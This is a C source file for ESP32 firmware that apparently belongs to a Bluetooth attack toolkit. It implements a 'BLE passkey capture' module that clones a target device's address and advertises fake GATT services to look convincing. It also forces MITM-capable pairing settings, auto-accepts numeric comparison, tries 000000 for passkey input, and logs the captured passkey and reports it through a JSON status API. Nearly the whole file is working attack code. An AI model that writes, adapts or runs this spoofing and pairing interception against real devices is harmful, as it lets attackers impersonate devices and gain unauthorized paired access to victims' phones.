/*
 * ble_passkey.c - BLE Passkey Capture Implementation
 *
 * Captures the BLE pairing passkey by spoofing as the target device
 * and intercepting the SMP pairing exchange.
 *
 * Thread safety:
 *   - `running` is volatile bool: set from stop()/timer, read in task
 *   - `captured_method` / `captured_passkey` written only from GAP
 *     callback (NimBLE host task) and read from HTTP handlers.
 *     On ESP32-S3 Xtensa, aligned char array writes are atomic for
 *     reads of the same length.
 *   - `cfg` is protected by mutex
 *   - `timeout_fired` is volatile for cross-task visibility
 *
 * Async flow:
 *   The GAP event callback NEVER calls vTaskDelay.  The passkey task
 *   waits on a loop checking `running` and `pairing_complete` with
 *   short delays.  The esp_timer fires after timeout_sec and sets
 *   running = false to break the loop.
 *
 * SMP config:
 *   We save the current Security Manager configuration before the
 *   attack, set our own (KEYBOARD_DISP + bonding + MITM + SC), and
 *   restore the original config on cleanup.  This ensures other BLE
 *   modules are not affected.
 *
 * Dependencies:
 *   - ble_common.h  (nimble_port_init + own_addr_type helper)
 *   - NimBLE stack  (host + controller)
 *   - esp_wifi      (may be active for other modules)
 *   - FreeRTOS
 *   - cJSON
 *   - esp_timer
 */

#include "ble_passkey.h"
#include "esp_log.h"
#include "esp_timer.h"
#include "esp_random.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/semphr.h"
#include "cJSON.h"
#include <string.h>
#include <stdio.h>

/* NimBLE headers */
#include "nimble/nimble_port.h"
#include "host/ble_hs.h"
#include "host/ble_gap.h"
#include "services/gap/ble_svc_gap.h"
#include "services/gatt/ble_svc_gatt.h"

#include "ble_common.h"

/* ================================================================== */
/*  Constants                                                          */
/* ================================================================== */

static const char *TAG = "ble_passkey";

#define DEFAULT_TIMEOUT_SEC          60
#define DEFAULT_ADV_DURATION_SEC     60
#define DEFAULT_AUTO_DISCONNECT      true
#define STOP_SEM_TIMEOUT_MS          5000
#define TASK_STACK_SIZE              4096
#define TASK_PRIORITY                5

/* ================================================================== */
/*  Module state                                                       */
/* ================================================================== */

/* Control */
static volatile bool running           = false;
static SemaphoreHandle_t mutex         = NULL;
static SemaphoreHandle_t task_exit_sem = NULL;
static TaskHandle_t task_handle        = NULL;

/* Timeout timer */
static esp_timer_handle_t timeout_timer = NULL;
static volatile bool timeout_fired      = false;

/* Timing */
static volatile int64_t start_time_ms  = 0;

/* Connection */
static volatile uint16_t active_conn_handle = 0xFFFF;
static volatile bool pairing_complete   = false;

/* Captured data — written from GAP callback, read from HTTP handlers.
 * Aligned writes up to 8 bytes are atomic on Xtensa, and snprintf
 * writes a trailing NUL, so readers always see a valid string. */
static char captured_method[32]  = "none";
static char captured_passkey[16] = "";

/* GATT server registered flag */
static bool gatt_registered = false;

/* Saved SM config (restored after attack) */
static uint8_t saved_sm_io_cap       = 0;
static uint8_t saved_sm_bonding      = 0;
static uint8_t saved_sm_mitm         = 0;
static uint8_t saved_sm_sc           = 0;
static uint8_t saved_sm_our_key_dist = 0;
static uint8_t saved_sm_their_key_dist = 0;

/* Configuration */
static ble_passkey_config_t cfg = {
    .target_addr        = "",
    .timeout_sec        = DEFAULT_TIMEOUT_SEC,
    .adv_duration_sec   = DEFAULT_ADV_DURATION_SEC,
    .auto_disconnect    = DEFAULT_AUTO_DISCONNECT,
};

/* ================================================================== */
/*  Forward declarations                                               */
/* ================================================================== */

static void passkey_task(void *arg);
static void timeout_cb(void *arg);
static int passkey_gap_cb(struct ble_gap_event *event, void *arg);

/* ================================================================== */
/*  GATT Server — minimal services to look like a real device          */
/* ================================================================== */

static const char *device_name = "BLE_Capture";

static int gap_chr_access(uint16_t conn_handle, uint16_t attr_handle,
                          struct ble_gatt_access_ctxt *ctxt, void *arg)
{
    (void)conn_handle;
    (void)attr_handle;
    (void)arg;

    int rc;
    switch (ctxt->op) {
        case BLE_GATT_ACCESS_OP_READ_CHR:
            rc = os_mbuf_append(ctxt->om, device_name, strlen(device_name));
            return rc == 0 ? 0 : BLE_ATT_ERR_INSUFFICIENT_RES;
        default:
            return BLE_ATT_ERR_UNLIKELY;
    }
}

static const struct ble_gatt_svc_def gatt_svcs[] = {
    {
        /* Generic Access Service */
        .type = BLE_GATT_SVC_TYPE_PRIMARY,
        .uuid = BLE_UUID16_DECLARE(BLE_SVC_GAP_UUID16),
        .includes = NULL,
        .characteristics = (struct ble_gatt_chr_def[]) {
            {
                .uuid = BLE_UUID16_DECLARE(BLE_SVC_GAP_CHR_UUID16_DEVICE_NAME),
                .access_cb = gap_chr_access,
                .arg = NULL,
                .flags = BLE_GATT_CHR_F_READ,
                .val_handle = NULL,
                .descriptors = NULL,
            },
            { 0 }
        },
    },
    {
        /* Generic Attribute Service */
        .type = BLE_GATT_SVC_TYPE_PRIMARY,
        .uuid = BLE_UUID16_DECLARE(0x1801),
        .includes = NULL,
        .characteristics = (struct ble_gatt_chr_def[]) {
            {
                .uuid = BLE_UUID16_DECLARE(0x2A05),
                .access_cb = NULL,
                .arg = NULL,
                .flags = BLE_GATT_CHR_F_INDICATE,
                .val_handle = NULL,
                .descriptors = NULL,
            },
            { 0 }
        },
    },
    {
        /* Battery Service — makes spoof look convincing */
        .type = BLE_GATT_SVC_TYPE_PRIMARY,
        .uuid = BLE_UUID16_DECLARE(0x180F),
        .includes = NULL,
        .characteristics = (struct ble_gatt_chr_def[]) {
            {
                .uuid = BLE_UUID16_DECLARE(0x2A19),
                .access_cb = NULL,
                .arg = NULL,
                .flags = BLE_GATT_CHR_F_READ | BLE_GATT_CHR_F_NOTIFY,
                .val_handle = NULL,
                .descriptors = NULL,
            },
            { 0 }
        },
    },
    { 0 }
};

/* ================================================================== */
/*  Helpers                                                            */
/* ================================================================== */

static int64_t now_ms(void)
{
    return (int64_t)esp_timer_get_time() / 1000;
}

static void addr_from_str(const char *s, uint8_t out[6])
{
    int vals[6] = {0};
    if (sscanf(s, "%x:%x:%x:%x:%x:%x",
               &vals[0], &vals[1], &vals[2],
               &vals[3], &vals[4], &vals[5]) == 6) {
        for (int i = 0; i < 6; i++) {
            out[i] = (uint8_t)vals[5 - i];
        }
    } else {
        memset(out, 0, 6);
    }
}

static const char *method_display_str(const char *m)
{
    if (strcmp(m, "numeric_comparison") == 0) return "Numeric Comparison";
    if (strcmp(m, "passkey_display") == 0)    return "Passkey Display";
    if (strcmp(m, "passkey_input") == 0)      return "Passkey Input";
    if (strcmp(m, "just_works") == 0)         return "Just Works";
    if (strcmp(m, "oob") == 0)                return "Out-of-Band";
    if (strcmp(m, "failed") == 0)             return "Failed";
    if (strcmp(m, "timeout") == 0)            return "Timeout";
    if (strcmp(m, "none") == 0)               return "None";
    return m;
}

static void cleanup_ble(void)
{
    int max_wait = 10;
    while (max_wait-- > 0) {
        bool busy = ble_gap_conn_active() || ble_gap_adv_active() || ble_gap_disc_active();
        if (!busy) break;

        if (ble_gap_conn_active()) ble_gap_conn_cancel();
        if (ble_gap_adv_active())  ble_gap_adv_stop();
        if (ble_gap_disc_active()) ble_gap_disc_cancel();
        vTaskDelay(pdMS_TO_TICKS(100));
    }
    ble_common_disconnect_all();
    vTaskDelay(pdMS_TO_TICKS(100));
}

/* Save/restore Security Manager configuration so we don't break
 * other BLE modules that may have different SM requirements. */
static void save_sm_config(void)
{
    saved_sm_io_cap       = ble_hs_cfg.sm_io_cap;
    saved_sm_bonding      = ble_hs_cfg.sm_bonding;
    saved_sm_mitm         = ble_hs_cfg.sm_mitm;
    saved_sm_sc           = ble_hs_cfg.sm_sc;
    saved_sm_our_key_dist = ble_hs_cfg.sm_our_key_dist;
    saved_sm_their_key_dist = ble_hs_cfg.sm_their_key_dist;
}

static void set_capture_sm_config(void)
{
    /* KEYBOARD_DISP: supports both display and input, maximises
     * the chance of getting a NUMCMP or DISP passkey action. */
    ble_hs_cfg.sm_io_cap = BLE_SM_IO_CAP_KEYBOARD_DISP;
    ble_hs_cfg.sm_bonding = 1;
    ble_hs_cfg.sm_mitm = 1;
    ble_hs_cfg.sm_sc = 1;
    ble_hs_cfg.sm_our_key_dist = BLE_SM_PAIR_KEY_DIST_ENC |
                                  BLE_SM_PAIR_KEY_DIST_ID;
    ble_hs_cfg.sm_their_key_dist = BLE_SM_PAIR_KEY_DIST_ENC |
                                    BLE_SM_PAIR_KEY_DIST_ID;
}

static void restore_sm_config(void)
{
    ble_hs_cfg.sm_io_cap       = saved_sm_io_cap;
    ble_hs_cfg.sm_bonding      = saved_sm_bonding;
    ble_hs_cfg.sm_mitm         = saved_sm_mitm;
    ble_hs_cfg.sm_sc           = saved_sm_sc;
    ble_hs_cfg.sm_our_key_dist = saved_sm_our_key_dist;
    ble_hs_cfg.sm_their_key_dist = saved_sm_their_key_dist;
}

/* ================================================================== */
/*  Timeout timer                                                      */
/* ================================================================== */

static void timeout_cb(void *arg)
{
    (void)arg;
    timeout_fired = true;
    running       = false;
    ESP_LOGW(TAG, "Timeout expired — stopping BLE passkey capture");
}

/* ================================================================== */
/*  GAP event callback                                                 */
/* ================================================================== */

static int passkey_gap_cb(struct ble_gap_event *event, void *arg)
{
    switch (event->type) {

    case BLE_GAP_EVENT_CONNECT:
        ESP_LOGI(TAG, "CONNECT: status=%d conn_handle=%d",
                 event->connect.status, event->connect.conn_handle);
        if (event->connect.status == 0) {
            active_conn_handle = event->connect.conn_handle;
            pairing_complete = false;
            ESP_LOGI(TAG, "Phone connected! Waiting for pairing...");
        } else {
            ESP_LOGW(TAG, "Connect failed: status=%d", event->connect.status);
            active_conn_handle = 0xFFFF;
        }
        return 0;

    case BLE_GAP_EVENT_DISCONNECT:
        ESP_LOGI(TAG, "DISCONNECT: reason=%d", event->disconnect.reason);
        active_conn_handle = 0xFFFF;
        return 0;

    case BLE_GAP_EVENT_PASSKEY_ACTION: {
        struct ble_sm_io pkey = {0};
        pkey.action = event->passkey.params.action;

        ESP_LOGI(TAG, "PASSKEY ACTION: action=%d", event->passkey.params.action);

        switch (event->passkey.params.action) {

        case BLE_SM_IOACT_NUMCMP: {
            /* Numeric Comparison: both devices show the same 6-digit number.
             * The passkey value is in event->passkey.params.numcmp.
             * This is THE value the user sees on their phone screen. */
            uint32_t pk = event->passkey.params.numcmp;
            ESP_LOGI(TAG, "===========================================");
            ESP_LOGI(TAG, "  NUMERIC COMPARISON");
            ESP_LOGI(TAG, "  Passkey: %06u", (unsigned)pk);
            ESP_LOGI(TAG, "  Auto-accepting...");
            ESP_LOGI(TAG, "===========================================");
            snprintf(captured_method, sizeof(captured_method), "numeric_comparison");
            snprintf(captured_passkey, sizeof(captured_passkey), "%06u", (unsigned)pk);
            pkey.numcmp_accept = 1;
            break;
        }

        case BLE_SM_IOACT_DISP: {
            /* Passkey Display: we must generate and display a 6-digit number.
             * The phone will show the same number and ask the user to confirm. */
            uint32_t pk = esp_random() % 1000000;
            ESP_LOGI(TAG, "===========================================");
            ESP_LOGI(TAG, "  PASSKEY DISPLAY");
            ESP_LOGI(TAG, "  Displayed: %06u", (unsigned)pk);
            ESP_LOGI(TAG, "===========================================");
            snprintf(captured_method, sizeof(captured_method), "passkey_display");
            snprintf(captured_passkey, sizeof(captured_passkey), "%06u", (unsigned)pk);
            pkey.passkey = pk;
            break;
        }

        case BLE_SM_IOACT_INPUT: {
            /* Passkey Input: we need to enter a passkey that the phone displays.
             * We try 000000 as a common default. */
            ESP_LOGI(TAG, "===========================================");
            ESP_LOGI(TAG, "  PASSKEY INPUT: Trying 000000");
            ESP_LOGI(TAG, "===========================================");
            snprintf(captured_method, sizeof(captured_method), "passkey_input");
            snprintf(captured_passkey, sizeof(captured_passkey), "000000");
            pkey.passkey = 0;
            break;
        }

        case BLE_SM_IOACT_OOB:
            ESP_LOGI(TAG, "  OOB pairing (not capturable)");
            snprintf(captured_method, sizeof(captured_method), "oob");
            snprintf(captured_passkey, sizeof(captured_passkey), "n/a");
            break;

        case BLE_SM_IOACT_NONE:
            /* Just Works — no passkey exchange */
            ESP_LOGI(TAG, "===========================================");
            ESP_LOGI(TAG, "  JUST WORKS (no passkey)");
            ESP_LOGI(TAG, "===========================================");
            snprintf(captured_method, sizeof(captured_method), "just_works");
            snprintf(captured_passkey, sizeof(captured_passkey), "n/a");
            break;

        default:
            ESP_LOGW(TAG, "  Unknown passkey action: %d",
                     event->passkey.params.action);
            snprintf(captured_method, sizeof(captured_method), "unknown");
            snprintf(captured_passkey, sizeof(captured_passkey), "n/a");
            break;
        }

        int rc = ble_sm_inject_io(event->passkey.conn_handle, &pkey);
        if (rc != 0) {
            ESP_LOGW(TAG, "ble_sm_inject_io failed: rc=%d", rc);
        }
        return 0;
    }

    case BLE_GAP_EVENT_ENC_CHANGE:
        ESP_LOGI(TAG, "ENC_CHANGE: status=%d", event->enc_change.status);
        if (event->enc_change.status == 0) {
            ESP_LOGI(TAG, "===========================================");
            ESP_LOGI(TAG, "  PAIRING COMPLETE!");
            ESP_LOGI(TAG, "  Method: %s", captured_method);
            ESP_LOGI(TAG, "  Passkey: %s", captured_passkey);
            ESP_LOGI(TAG, "===========================================");
            pairing_complete = true;

            /* Optionally disconnect after capture */
            if (cfg.auto_disconnect) {
                vTaskDelay(pdMS_TO_TICKS(1000));
                if (active_conn_handle != 0xFFFF) {
                    ble_gap_terminate(active_conn_handle,
                                      BLE_ERR_REM_USER_CONN_TERM);
                }
            }
        } else {
            ESP_LOGW(TAG, "Pairing FAILED: status=%d",
                     event->enc_change.status);
            snprintf(captured_method, sizeof(captured_method), "failed");
            captured_passkey[0] = '\0';
        }
        return 0;

    case BLE_GAP_EVENT_REPEAT_PAIRING:
        /* Accept repeat pairing to avoid blocking */
        return BLE_GAP_REPEAT_PAIRING_RETRY;

    case BLE_GAP_EVENT_MTU:
        ESP_LOGD(TAG, "MTU: %d", event->mtu.value);
        return 0;

    default:
        return 0;
    }
}

/* ================================================================== */
/*  Spoof advertising                                                  */
/* ================================================================== */

static void start_spoof_adv(void)
{
    /* Copy target address under mutex */
    char addr_copy[32];
    xSemaphoreTake(mutex, portMAX_DELAY);
    strncpy(addr_copy, cfg.target_addr, sizeof(addr_copy) - 1);
    addr_copy[sizeof(addr_copy) - 1] = '\0';
    xSemaphoreGive(mutex);

    uint8_t target_addr[6];
    addr_from_str(addr_copy, target_addr);

    /* Set our random address to look like the target (random static) */
    uint8_t spoof_addr[6];
    memcpy(spoof_addr, target_addr, 6);
    spoof_addr[5] = (spoof_addr[5] & 0x3F) | 0xC0;  /* Random static */

    int rc = ble_hs_id_set_rnd(spoof_addr);
    if (rc != 0) {
        ESP_LOGW(TAG, "Failed to set random addr (rc=%d)", rc);
    }

    /* Build advertisement data — looks like a generic BLE device */
    uint8_t adv_data[] = {
        0x02, 0x01, 0x06,                       /* Flags: LE gen disc, BR/EDR not supp */
        0x03, 0x03, 0x0F, 0x18,                 /* Battery Service UUID */
        0x04, 0x09, 'C', 'a', 'p',              /* Short name: "Cap" */
    };

    struct ble_gap_adv_params adv_params = {
        .conn_mode = BLE_GAP_CONN_MODE_UND,      /* Connectable undirected */
        .disc_mode = BLE_GAP_DISC_MODE_GEN,       /* General discoverable */
        .itvl_min = 0x0020,                       /* Fast: 20ms */
        .itvl_max = 0x0030,                       /* 30ms */
        .channel_map = 0x07,                      /* All 3 adv channels */
        .filter_policy = 0,
    };

    rc = ble_gap_adv_set_data(adv_data, sizeof(adv_data));
    if (rc != 0) {
        ESP_LOGE(TAG, "Set adv data failed: %d", rc);
        return;
    }

    /* own_addr_type=1 (random) since we set a random address */
    rc = ble_gap_adv_start(1, NULL, BLE_HS_FOREVER,
                           &adv_params, passkey_gap_cb, NULL);
    if (rc != 0) {
        ESP_LOGE(TAG, "Adv start failed: %d", rc);
        return;
    }

    ESP_LOGI(TAG, "Spoof advertising as %s", addr_copy);
}

/* ================================================================== */
/*  Main task                                                          */
/* ================================================================== */

static void passkey_task(void *arg)
{
    (void)arg;

    ESP_LOGI(TAG, "Passkey task started (target=%s, timeout=%us)",
             cfg.target_addr, (unsigned)cfg.timeout_sec);

    /* Reset capture state */
    snprintf(captured_method, sizeof(captured_method), "none");
    captured_passkey[0] = '\0';
    active_conn_handle = 0xFFFF;
    pairing_complete = false;

    /* Save current SM config and set our capture config */
    save_sm_config();
    set_capture_sm_config();

    /* Clean up any leftover BLE state */
    cleanup_ble();

    /* Start spoof advertising */
    start_spoof_adv();

    start_time_ms = now_ms();

    /* Wait loop: run until timeout, stop, or pairing complete */
    while (running) {
        vTaskDelay(pdMS_TO_TICKS(500));

        if (pairing_complete) {
            ESP_LOGI(TAG, "Pairing captured — waiting for disconnect...");
            /* Give the disconnect event time to fire */
            int wait = 0;
            while (running && wait < 3000) {
                vTaskDelay(pdMS_TO_TICKS(500));
                wait += 500;
            }
            break;
        }
    }

    /* Cleanup */
    if (ble_gap_adv_active()) ble_gap_adv_stop();

    /* If we still have an active connection, terminate it */
    if (active_conn_handle != 0xFFFF) {
        ble_gap_terminate(active_conn_handle, BLE_ERR_REM_USER_CONN_TERM);
        vTaskDelay(pdMS_TO_TICKS(200));
    }

    cleanup_ble();
    restore_sm_config();

    if (!pairing_complete && timeout_fired) {
        snprintf(captured_method, sizeof(captured_method), "timeout");
        captured_passkey[0] = '\0';
        ESP_LOGW(TAG, "Passkey capture timed out after %us",
                 (unsigned)cfg.timeout_sec);
    }

    if (timeout_timer) {
        esp_timer_stop(timeout_timer);
    }

    running = false;

    ESP_LOGI(TAG, "Passkey task exiting (method=%s, passkey=%s)",
             captured_method, captured_passkey);

    if (task_exit_sem) {
        xSemaphoreGive(task_exit_sem);
    }

    task_handle = NULL;
    vTaskDelete(NULL);
}

/* ================================================================== */
/*  Public API — Lifecycle                                             */
/* ================================================================== */

void ble_passkey_init(void)
{
    ble_common_init();

    mutex         = xSemaphoreCreateMutex();
    task_exit_sem = xSemaphoreCreateBinary();

    /* Register GATT services once (idempotent) */
    if (!gatt_registered) {
        ble_gatts_count_cfg(gatt_svcs);
        ble_gatts_add_svcs(gatt_svcs);
        gatt_registered = true;
    }

    /* Create one-shot timeout timer */
    if (timeout_timer == NULL) {
        esp_timer_create_args_t timer_args = {
            .callback = timeout_cb,
            .name     = "ble_passkey_timeout",
        };
        esp_timer_create(&timer_args, &timeout_timer);
    }

    ESP_LOGI(TAG, "ble_passkey initialized");
}

void ble_passkey_start(const char *target_addr)
{
    ble_passkey_config_t default_cfg = {
        .target_addr      = "",
        .timeout_sec      = DEFAULT_TIMEOUT_SEC,
        .adv_duration_sec = DEFAULT_ADV_DURATION_SEC,
        .auto_disconnect  = DEFAULT_AUTO_DISCONNECT,
    };
    if (target_addr) {
        strncpy(default_cfg.target_addr, target_addr,
                sizeof(default_cfg.target_addr) - 1);
    }
    ble_passkey_start_config(&default_cfg);
}

void ble_passkey_start_config(const ble_passkey_config_t *new_cfg)
{
    if (running) {
        ESP_LOGW(TAG, "Already running — stop first");
        return;
    }

    xSemaphoreTake(mutex, portMAX_DELAY);
    if (new_cfg) {
        cfg = *new_cfg;
    }
    cfg.target_addr[sizeof(cfg.target_addr) - 1] = '\0';
    xSemaphoreGive(mutex);

    /* Reset state */
    timeout_fired     = false;
    active_conn_handle = 0xFFFF;
    pairing_complete  = false;
    snprintf(captured_method, sizeof(captured_method), "none");
    captured_passkey[0] = '\0';

    /* Start timeout timer */
    if (timeout_timer) {
        esp_timer_start_once(timeout_timer,
                             (uint64_t)cfg.timeout_sec * 1000000);
    }

    running = true;

    BaseType_t created = xTaskCreate(passkey_task, "ble_passkey",
                                     TASK_STACK_SIZE, NULL,
                                     TASK_PRIORITY, &task_handle);
    if (created != pdPASS) {
        ESP_LOGE(TAG, "Failed to create passkey task");
        running = false;
        if (timeout_timer) {
            esp_timer_stop(timeout_timer);
        }
    }
}

void ble_passkey_stop(void)
{
    if (!running) return;

    ESP_LOGI(TAG, "Stopping BLE passkey capture...");
    running = false;

    /* Wait for task to exit */
    if (task_exit_sem) {
        if (xSemaphoreTake(task_exit_sem, pdMS_TO_TICKS(STOP_SEM_TIMEOUT_MS)) != pdTRUE) {
            ESP_LOGW(TAG, "Task exit timeout — forcing delete");
            if (task_handle != NULL) {
                vTaskDelete(task_handle);
                task_handle = NULL;
            }
        }
    }

    if (timeout_timer) {
        esp_timer_stop(timeout_timer);
    }

    restore_sm_config();

    task_handle = NULL;
    ESP_LOGI(TAG, "BLE passkey capture stopped (method=%s, passkey=%s)",
             captured_method, captured_passkey);
}

/* ================================================================== */
/*  Public API — Status getters                                        */
/* ================================================================== */

bool ble_passkey_is_running(void)
{
    return running;
}

int32_t ble_passkey_get_elapsed_sec(void)
{
    if (!running && start_time_ms == 0) return 0;
    int64_t elapsed = now_ms() - start_time_ms;
    return (int32_t)(elapsed / 1000);
}

int32_t ble_passkey_get_remaining_sec(void)
{
    if (!running) return 0;
    int32_t elapsed = ble_passkey_get_elapsed_sec();
    int32_t remaining = (int32_t)cfg.timeout_sec - elapsed;
    return remaining > 0 ? remaining : 0;
}

bool ble_passkey_was_timeout(void)
{
    return timeout_fired;
}

bool ble_passkey_is_pairing_complete(void)
{
    return pairing_complete;
}

const char *ble_passkey_get_method(void)
{
    return captured_method;
}

const char *ble_passkey_get_passkey(void)
{
    return captured_passkey;
}

cJSON *ble_passkey_get_status_json(void)
{
    cJSON *root = cJSON_CreateObject();
    if (!root) return NULL;

    cJSON_AddBoolToObject(root, "running", running);
    cJSON_AddStringToObject(root, "target",
                            cfg.target_addr[0] ? cfg.target_addr : "");
    cJSON_AddStringToObject(root, "method", captured_method);
    cJSON_AddStringToObject(root, "method_display",
                            method_display_str(captured_method));
    cJSON_AddStringToObject(root, "passkey", captured_passkey);
    cJSON_AddBoolToObject(root, "pairing_complete", pairing_complete);
    cJSON_AddBoolToObject(root, "timeout", timeout_fired);
    cJSON_AddNumberToObject(root, "timeout_sec", cfg.timeout_sec);
    cJSON_AddNumberToObject(root, "elapsed_sec",
                            ble_passkey_get_elapsed_sec());
    cJSON_AddNumberToObject(root, "remaining_sec",
                            ble_passkey_get_remaining_sec());
    cJSON_AddBoolToObject(root, "auto_disconnect", cfg.auto_disconnect);
    cJSON_AddNumberToObject(root, "conn_handle", active_conn_handle);

    return root;
}
